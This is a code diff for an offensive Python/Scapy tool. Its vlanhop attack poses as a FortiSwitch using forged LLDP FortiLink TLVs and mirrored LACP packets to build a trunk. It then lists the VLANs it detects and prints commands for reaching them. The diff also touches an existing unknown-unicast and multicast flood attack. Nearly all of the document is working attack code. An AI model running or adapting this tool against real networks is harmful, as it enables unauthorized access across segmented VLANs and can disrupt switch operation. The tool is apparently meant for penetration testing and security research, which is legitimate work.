@@ -30,7 +30,11 @@ flood_parser.add_argument("-d","--destinationip",help="Destination IP Address",d
 flood_parser.add_argument("-dmac","--destinationmac",help="Destination MAC Address",default="00:01:02:03:04:05")
 
 #vlanhop_parser.add_argument("-a","--activerecon",help="Send additional packets to detect VLANs. Noisy!")
-vlanhop_parser.add_argument("-ac","--autoint",help="Automatically create VLAN interfaces for all detected VLANs")
+#vlanhop_parser.add_argument("-ac","--autoint",help="Automatically create VLAN interfaces for all detected VLANs")
+vlanhop_parser.add_argument("-hn","--hostname",help="Hostname of fake FortiSwitch",default="SWITCH32")
+#vlanhop_parser.add_argument("-tn","--trunkname",help="Trunkname for FortiSwitch",default="")
+vlanhop_parser.add_argument("-sn","--serialnumber",help="Serialnumber of fake FortiSwitch",default="S108DVWSM12345")
+
 
 main_args = main_parser.parse_args()
 action = main_args.action
@@ -47,6 +51,9 @@ isl_link_flags = {
 }
 
 
+event_LACP_Established = threading.Event()
+
+
 # level 0 = standard output, level 1 = info, level 2 = debug
 def dprint(*args,level=0):
    if level <= main_args.verbose:
@@ -54,71 +61,76 @@ def dprint(*args,level=0):
 
 
 def fortilink_isl(lldp_keep_alive):
-    dprint("Establishing FortiLink ISL",level=2)
+    print("Establishing FortiLink ISL...",end="",flush=True)
 
     sendp(lldp_keep_alive,verbose=0)
 
     packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
+    if not packet:
+       print("Failed")
+       print("Error: No LACP Packet received")
+       return
+
     lacp_response=packet[0]
     del lacp_response.src
-    lacp_response[LACP].actor_system = "00:0c:29:34:ab:f1"
+    lacp_response[LACP].actor_system = get_if_hwaddr(conf.iface)
     lacp_response[LACP].actor_system_priority = lacp_response[LACP].actor_system_priority - 1
     sendp(lacp_response,verbose=0)
 
     packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
+    
+    # Set Partner Settings
     lacp_response[LACP].partner_system_priority = packet[0][LACP].actor_system_priority
     lacp_response[LACP].partner_system = packet[0][LACP].actor_system
     lacp_response[LACP].partner_key = packet[0][LACP].actor_key
     lacp_response[LACP].partner_port_priority = packet[0][LACP].actor_port_priority
     lacp_response[LACP].partner_port_number = packet[0][LACP].actor_port_number
 
-    #lacp_response[LACP].partner_state = packet[0][LACP].actor_state
-    #lacp_response[LACP].actor_state = packet[0][LACP].actor_state
-    #sendp(lacp_response)
-
-    # Todo: check for states
-
     while True:
-       time.sleep(1)
-       packet = sniff(filter="ether proto 0x8809", count=1, timeout=20)
+       packet = sniff(filter="ether proto 0x8809", count=1, timeout=5)
+       if packet:
+          if (not event_LACP_Established.is_set() and packet[0][LACP].partner_state & 0b00110000):
+             print("LACP Trunk established")
+             event_LACP_Established.set()
 
-       # Mirror settings of opposite LACP Trunk
-       lacp_response[LACP].actor_state = packet[0][LACP].actor_state
-       lacp_response[LACP].partner_state = packet[0][LACP].actor_state
+       # Mirror state of opposite LACP Trunk
+          lacp_response[LACP].actor_state = packet[0][LACP].actor_state
+          lacp_response[LACP].partner_state = packet[0][LACP].actor_state
        sendp(lacp_response,verbose=0)
        sendp(lldp_keep_alive,verbose=0)
+       time.sleep(1)
 
 
 def vlanhop(iface=main_args.interface):
     print("Launching vlanhop attack")
-    print("Listening for LLDP packets")
+    print("Listening for LLDP packets...",end="",flush=True)
 
     # Listen to LLDP packets
     packet=sniff(filter="ether proto 0x88cc",count=1,timeout=60)
 
-    if (not packet[0]):
+    if (not packet):
+       print("timeout")
        dprint("FAIL: No LLDP packet received")
        return
-
-    #todo: test if no packet received
-    dprint("LLDP packet received:")
-    dprint("System name:",packet[0][LLDPDUSystemName].system_name)
-    dprint("System description:",packet[0][LLDPDUSystemDescription].description)
-    dprint("Switchport interface:",packet[0][LLDPDUPortDescription].description)
+    
+    dprint("received")
+    dprint("System name:",packet[0][LLDPDUSystemName].system_name.decode("UTF-8"))
+    dprint("System description:",packet[0][LLDPDUSystemDescription].description.decode("UTF-8"))
+    dprint("Switchport interface:",packet[0][LLDPDUPortDescription].description.decode("UTF-8"))
     dprint("Switch management address:",inet_ntop(socket.AF_INET,(packet[0][LLDPDUManagementAddress].management_address)))
 
     if not (b"FortiSwitch" in packet[0][LLDPDUSystemDescription].description):
-       dprint("FAIL: Not FortiSwitch LLDP Packet")
+       print("FAIL: Not a FortiSwitch LLDP Packet")
        return
 
     lldp_response = packet[0]
-    lldp_response[LLDPDUChassisID].id = "00:0c:29:34:ab:f1"
+    lldp_response[LLDPDUChassisID].id = get_if_hwaddr(conf.iface)
     del lldp_response.src
     del lldp_response[LLDPDUSystemName]._length
-    lldp_response[LLDPDUSystemName].system_name = ""
+    lldp_response[LLDPDUSystemName].system_name = main_args.hostname
 
     i = 1
-    dprint("Check for Fortigate TLVs")
+    print("Listening for Fortigate LLDP TLVs...",end="",flush=True)
     remoteAutoISL = False
     while packet[0].getlayer(LLDPDUGenericOrganisationSpecific, nb=i):
        org_layer = packet[0].getlayer(LLDPDUGenericOrganisationSpecific, nb=i)
@@ -129,46 +141,47 @@ def vlanhop(iface=main_args.interface):
           #type 1 hostname
           if org_layer.subtype==1:
              dprint("FortiLink Hostname TLV ID 1",level=1)
-             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = "Trunkie"
+             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = main_args.hostname
              del lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i)._length
 
           #type 2 serial
           elif org_layer.subtype==2:
              dprint("FortiLink Serialnumber TLV ID 2",level=1)
-             dprint("Switch Serialnumber:",org_layer.data)
-             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = "S108DVWSM12345"
+             print("Found")
+             print("Switch Serialnumber:",org_layer.data.decode("UTF-8"))
+             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = main_args.serialnumber
              del lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i)._length
 
           #type 3 port_options
           elif org_layer.subtype==3:
              dprint("FortiLink link properties TLV ID 3",level=1)
              dprint("Link properties:",org_layer.data[3],level=1)
-             if org_layer.data[3] & (1 << isl_link_flags["auto-isl"]):
-                dprint("auto-isl is enabled!") 
-                remoteAutoISL = True
-                lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = b"\x00\x00\x02\x5b\x00\x10ABCDEFGHIJKLNMOP"
+             remoteAutoISL = True
+             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = b"\x00\x00\x02\x5b\x00\x107C08aPXFm8QrATSP"
 
        i += 1
 
     if not remoteAutoISL:
-       dprint("FAIL: Switch Auto-ISL is disabled")
+       print("Non Found")
+       print("FAIL: Switch Auto-ISL is disabled")
        return
 
-    # sendp(lldp_response)
-
-    # Setup LACP Trunk
-
     lacp_thread = threading.Thread(target=fortilink_isl,args=(lldp_response,))
-    lacp_thread.daemon = True  # Set as a daemon thread so it terminates when the main program exits
+    lacp_thread.daemon = True
     lacp_thread.start()
 
-    fortilink_packet=sniff(filter="ether proto 0x88ff",count=1,store=1,timeout=20)
-    if not fortilink_packet:
-        dprint("FAIL: No FortiLink packet received, ISL not established")
-        return
+    event_LACP_Established.wait(timeout=65)
 
-    dprint("SUCCESS: FortiLink Packet received, ISL established")
-    dprint("Listing detected VLANS:")
+    if not event_LACP_Established.is_set():
+       print("FAIL: LACP trunk could not be established")
+
+    fortilink_packet=sniff(filter="ether proto 0x88ff",count=1,store=1,timeout=20)
+
+    print("")
+    print("To access the VLANs from your host run:  sudo ip link add link ",conf.iface," name ",conf.iface,".<vlan-id> type vlan id <vlan-id>",sep="")
+    print("Keep this program running in the background")
+    print("")
+    print("Detected VLANs (passivly):")
 
     detected_vlans = []
 
@@ -182,17 +195,8 @@ def vlanhop(iface=main_args.interface):
                  print(single_packet[Dot1Q].vlan)
 
 
-    # Parse LLDP Parameters
-
-    # Check if auto-isl enable
-
-    # Send LLDP response
-
-
-    # Sniff for VLAN packets / List results
-
-
 def l2_flood(floodtype,iface=main_args.interface):
+    print("Launching flood attack:",floodtype)
     ttl=10
     if floodtype == "unknown_multicast":
        print("Generating",main_args.packetcount,"multicast flood packets")
@@ -201,7 +205,6 @@ def l2_flood(floodtype,iface=main_args.interface):
           dstip = "224.0.0.0"
        dst_mac = "11:22:33:44:55:66"
        ttl=1
-
 
     if floodtype == "unknown_unicast":
        print("Generating",main_args.packetcount,"unicast flood packets")
@@ -240,7 +243,6 @@ def l2_flood(floodtype,iface=main_args.interface):
 
 if os.geteuid() != 0:
   print("--- Script not started as root user, possible permissions problem ---")
-
 
 if action=="flood":
    l2_flood(floodtype=main_args.floodtype)
